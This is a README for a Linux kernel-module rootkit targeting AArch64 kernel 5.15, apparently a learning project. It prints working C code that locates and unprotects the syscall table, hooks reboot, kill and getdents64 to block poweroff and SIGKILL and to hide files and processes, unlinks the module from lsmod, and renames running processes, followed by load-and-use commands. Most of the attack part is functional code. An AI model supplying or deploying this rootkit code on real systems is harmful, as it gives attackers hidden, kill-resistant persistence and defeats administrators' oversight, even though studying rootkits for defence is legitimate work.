
# Rootkit - Loadable Kernel Module

You can also see this document on [HackMD](https://hackmd.io/@Cr1xxty1RMCCkPcMXYPWeg/rootkit).

- [Intro Rootkit](#intro-rootkit)
- [Getting Started (ARM64 VM Setup)](#getting-started-arm64-vm-setup)
- [Explanation](#explanation)
- [How to use this LKM](#how-to-use-this-lkm)
- [Reference](#reference)

---

## Intro Rootkit

**Environment:**
> Both the rootkit and the test program run on an AArch64 machine.  
> The rootkit works as an independent module on the mainline Linux v5.15.

A rootkit is essentially malware that runs in kernel space. To achieve this, it must be implemented as a Loadable Kernel Module (LKM).

LKMs run in kernel mode and have access to all kernel internal structures and functions. They are commonly used to extend kernel functionality or implement device drivers — and in security research, to hook syscalls and hide themselves from userspace.

This rootkit provides the following features:
1. Hide / unhide the module from `lsmod`
2. Masquerade process names
3. Hook / unhook syscalls (`reboot`, `kill`, `getdents64`)

---

## Getting Started (ARM64 VM Setup)

**New to kernel development?** Before running this rootkit, you need an ARM64 Linux environment running kernel v5.15. If you don't have one set up yet, follow the step-by-step guide:

**[arm64-vm-setup.md](./arm64-vm-setup.md)** — How to build a kernel v5.15 development VM on Apple Silicon (macOS M-series) using QEMU and Docker. Covers:
- Cross-compiling the kernel
- Booting a Debian VM with your custom kernel
- Writing and loading your first kernel module
- Beginner-friendly explanations of key kernel concepts

Once your VM is running kernel v5.15, come back here to build and load the rootkit.

---

## Explanation

After entering `rootkit_init`, the syscall table address is located first, then the original syscall handlers are saved before hooking.

```c
__sys_call_table = get_syscall_table();
if(!__sys_call_table) {
    printk(KERN_INFO "Failed to find sys_call_table\n");
    return 1;
}

orig_reboot = (t_syscall)__sys_call_table[__NR_reboot];
orig_kill = (t_syscall)__sys_call_table[__NR_kill];
orig_getdents64 = (t_syscall)__sys_call_table[__NR_getdents64];
```

`kallsyms_lookup_name` is located via kprobe (it was unexported in kernel 5.7+), then used to resolve all required symbol addresses:

```c
static unsigned long *get_syscall_table(void)
{
    unsigned long *syscall_table;

    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name;
    register_kprobe(&kp);
    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);

    syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
    update_mapping_prot = (void *)kallsyms_lookup_name("update_mapping_prot");
    start_rodata = (unsigned long)kallsyms_lookup_name("__start_rodata");
    init_begin = (unsigned long)kallsyms_lookup_name("__init_begin");

    printk(KERN_INFO "sys_call_table address: %p\n", syscall_table);
    return syscall_table;
}
```

Hooking requires temporarily removing the read-only protection on the kernel's rodata section, then restoring it:

```c
static inline void protect_memory(void)
{
    update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata, section_size, PAGE_KERNEL_RO);
}

static inline void unprotect_memory(void)
{
    update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata, section_size, PAGE_KERNEL);
}

static int hook(void) {
    unprotect_memory();

    __sys_call_table[__NR_reboot]     = (unsigned long) &hacked_reboot;
    __sys_call_table[__NR_kill]       = (unsigned long) &hacked_kill;
    __sys_call_table[__NR_getdents64] = (unsigned long) &hacked_getdents64;

    protect_memory();
    return 0;
}
```

On module removal, the original syscall handlers are restored:

```c
static void __exit rootkit_exit(void)
{
    unprotect_memory();

    __sys_call_table[__NR_reboot]     = (unsigned long)orig_reboot;
    __sys_call_table[__NR_kill]       = (unsigned long)orig_kill;
    __sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;

    protect_memory();

    pr_info("%s: removed\n", OURMODNAME);
    cdev_del(kernel_cdev);
    unregister_chrdev_region(major, 1);
}
```

---

### Hide / Unhide Module

Uses a `hidden` flag to track state. When hiding, the module removes itself from the kernel's module linked list (making it invisible to `lsmod`) and saves the previous list entry for later reinsertion.

```c
static struct list_head *prev_module;
static short hidden = 0;

void module_show(void)
{
    list_add(&THIS_MODULE->list, prev_module);
    hidden = 0;
}

void module_hide(void)
{
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    hidden = 1;
}
```

---

### Masquerade Process Name

Copies the request structs from userspace, then calls `change_process_name` for each entry. A new name longer than or equal to the original is silently skipped (to avoid overflowing the fixed-size `comm` field).

```c
case IOCTL_MOD_MASQ:
    if (copy_from_user(&user_req, (struct masq_proc_req *)arg, sizeof(struct masq_proc_req)))
        return -EFAULT;

    req_array = kmalloc_array(user_req.len, sizeof(struct masq_proc), GFP_KERNEL);
    if (!req_array)
        return -ENOMEM;

    if (copy_from_user(req_array, user_req.list, user_req.len * sizeof(struct masq_proc))) {
        kfree(req_array);
        return -EFAULT;
    }

    for (i = 0; i < user_req.len; ++i) {
        if (strlen(req_array[i].new_name) >= strlen(req_array[i].orig_name))
            continue;
        change_process_name(req_array[i].orig_name, req_array[i].new_name);
    }
```

`change_process_name` walks the process list and overwrites the `comm` field of any matching task:

```c
int change_process_name(const char *orig_name, const char *new_name) {
    struct task_struct *p = NULL;
    int found = 0;

    for_each_process(p) {
        if (strcmp(p->comm, orig_name) == 0) {
            strncpy(p->comm, new_name, TASK_COMM_LEN - 1);
            p->comm[TASK_COMM_LEN - 1] = '\0';
            found = 1;
        }
    }

    return found ? 0 : -1;
}
```

---

### Hooked Syscalls

**reboot** — intercepts `LINUX_REBOOT_CMD_POWER_OFF` and drops it; all other reboot commands pass through. The `cmd` argument is in `regs[2]` per the [AArch64 syscall ABI](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md).

```c
static asmlinkage int hacked_reboot(const struct pt_regs *pt_regs) {
    unsigned int cmd = (unsigned int) pt_regs->regs[2];

    if (cmd == LINUX_REBOOT_CMD_POWER_OFF)
        return 0;  // silently deny

    return orig_reboot(pt_regs);
}
```

**kill** — intercepts `SIGKILL` (signal 9) and drops it; all other signals pass through. The signal number is in `regs[1]`.

```c
static asmlinkage int hacked_kill(const struct pt_regs *pt_regs)
{
    int sig = (int) pt_regs->regs[1];

    if (sig == 9)
        return 0;  // silently deny SIGKILL

    return orig_kill(pt_regs);
}
```

**getdents64** — called by `ls` / `readdir`. After the real syscall runs, the result buffer is post-processed to remove entries matching `HIDDEN_FILE` or invisible PIDs.

```c
static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs) {
    // ...
    while (off < ret) {
        dir = (void *)kdirent + off;
        if (should_hide(dir)) {
            if (dir == kdirent) {
                ret -= dir->d_reclen;
                memmove(dir, (void *)dir + dir->d_reclen, ret);
                continue;
            }
            prev->d_reclen += dir->d_reclen;
        } else {
            prev = dir;
        }
        off += dir->d_reclen;
    }
    // ...
}
```

---

## How to use this LKM

### Load the Rootkit

```bash
make
sudo insmod rootkit.ko
dmesg | tail
# Note the major number printed, e.g.: "The major number for your device is 510"
sudo mknod /dev/rootkit c [major number] 0
```

### Generate Test Files

```bash
# Builds userTest, NTUST, MIT, hsuckd executables
make generateTestFile
```

```bash
sudo ./userTest 0   # IOCTL_MOD_HIDE
sudo ./userTest 1   # IOCTL_MOD_MASQ
sudo ./userTest 2   # IOCTL_MOD_HOOK
sudo ./userTest 3   # IOCTL_FILE_HIDE
```

---

### Hide / Unhide Module

```bash
lsmod | head            # rootkit is visible

sudo ./userTest 0       # hide
lsmod | head            # rootkit is gone

sudo ./userTest 0       # unhide
lsmod | head            # rootkit is back
```

---

### Masquerade Process Name

```bash
./NTUST &
./MIT &
ps ao pid,comm          # shows NTUST and MIT

sudo ./userTest 1       # trigger masquerade

ps ao pid,comm
# NTUST → NTU  (shorter name, succeeds)
# MIT unchanged (new name "standardford" is longer, skipped)
```

---

### Hook / Unhook Syscalls

Install the hooks first:

```bash
sudo ./userTest 2
```

**reboot**

```bash
sudo systemctl --force --force poweroff   # intercepted — machine stays up
sudo systemctl --force --force reboot     # passes through — machine reboots
```

**kill**

```bash
./hsuckd &
ps aux | grep hsuckd
kill -9 [pid]           # SIGKILL intercepted — process survives
kill -10 [pid]          # other signals still work
```

**getdents64**

```bash
ls                      # HiddenFile is visible

sudo ./userTest 3

ls                      # HiddenFile is now hidden
```

---

## Reference

- [Linux Rootkit 學習資源筆記](https://hackercat.org/linux/linux-rootkit-resource)
- [Linux LKM Rootkit Tutorial | Linux Kernel Module Rootkit](https://www.youtube.com/watch?v=hsk450he7nI)
- [Linux Rootkit系列](https://cloud.tencent.com/developer/article/1036559)
- [TheXcellerator Linux Rootkits](https://xcellerator.github.io/tags/rootkit/)
- [Hiding Kernel Modules](https://github.com/xcellerator/linux_kernel_hacking/tree/master/3_RootkitTechniques/3.0_hiding_lkm)
- [linux_kernel_hacking](https://github.com/xcellerator/linux_kernel_hacking/tree/master)
- [Diamorphine](https://github.com/m0nad/Diamorphine/tree/master)
